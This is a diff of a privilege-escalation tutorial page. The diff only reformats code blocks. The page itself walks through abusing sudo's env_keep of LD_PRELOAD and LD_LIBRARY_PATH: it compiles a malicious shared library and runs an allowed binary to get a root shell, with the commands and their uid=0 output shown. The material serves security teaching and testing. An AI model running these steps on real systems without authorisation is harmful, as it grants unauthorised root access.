@@ -60,14 +60,13 @@ If the binary does not allow you to get a shell instantly, you can try other thi
 
 Sometimes the program itself is not exploitable, but there may be a `env_keep` option. This option allows you to inherit environment variables while executing the program, letting it do different things than normal. Two dangerous environment variables here are `LD_PRELOAD` and `LD_LIBRARY_PATH`, because they allow you to overwrite the libc path of the program to another file that you can control. This means you can execute any C library you make before the real sudo program runs.&#x20;
 
-```shell-session
-$ sudo -l
-Matching Defaults entries for user on this host:
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ sudo -l
+</strong>Matching Defaults entries for user on this host:
     env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
 
 User user may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/apache2
-```
+</code></pre>
 
 The first `LD_PRELOAD` just specifies the direct path to the library. To compile a malicious library yourself just make some C code to execute a privileged shell, and compile it like a library:
 
@@ -91,17 +90,15 @@ $ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 
 Now you have the malicious preload.so file that you can include by setting the `LD_PRELOAD` before running the allowed sudo program (make sure to use the full path):
 
-```shell-session
-$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
+</strong># id
 uid=0(root) gid=0(root) groups=0(root)
-```
+</code></pre>
 
 Then for the `LD_LIBRARY_PATH` option there is another similar way. This variable only sets the directory to find the other libraries in, so we first need to know what libraries are loaded to then overwrite them. Do this using `ldd`:
 
-```shell-session
-$ ldd /usr/sbin/apache2
-        linux-vdso.so.1 =>  (0x00007fff8f5ff000)
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ldd /usr/sbin/apache2
+</strong>        linux-vdso.so.1 =>  (0x00007fff8f5ff000)
         libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f52d4527000)
         libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f52d4303000)
         libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f52d40c9000)
@@ -113,7 +110,7 @@ $ ldd /usr/sbin/apache2
         libdl.so.2 => /lib/libdl.so.2 (0x00007f52d32f8000)
         libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f52d30d0000)
         /lib64/ld-linux-x86-64.so.2 (0x00007f52d49e4000)
-```
+</code></pre>
 
 We can choose any of these filenames to overwrite. Let's take `libcrypt.so.1` for example. We'll again compile some C code to a valid library with the functions that it will expect:
 
@@ -134,9 +131,8 @@ void hijack() {
 
 Then we compile it again to a library and set the `LD_LIBRARY_PATH` to a directory containing our malicious library:
 
-```shell-session
-$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
-$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+</strong><strong>$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
+</strong># id
 uid=0(root) gid=0(root) groups=0(root)
-```
+</code></pre>
